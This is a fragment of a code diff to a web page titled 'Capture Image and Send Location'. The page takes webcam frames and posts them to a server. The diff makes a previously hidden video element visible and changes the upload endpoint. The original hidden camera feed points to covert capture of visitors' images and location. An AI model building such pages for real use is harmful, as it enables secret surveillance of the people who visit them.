@@ -5,7 +5,7 @@
     <title>Capture Image and Send Location</title>
 </head>
 <body>
-    <video id="video" width="640" height="480" autoplay style="display: none;"></video>
+    <video id="video" width="640" height="480" autoplay></video>
     <canvas id="canvas" style="display: none;"></canvas>
 
     <script>
@@ -31,7 +31,7 @@
             const dataUrl = canvas.toDataURL('image/png');
 
             // Kirim gambar ke server
-            fetch('http://127.0.0.1:5000', {
+            fetch('/upload', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/x-www-form-urlencoded',
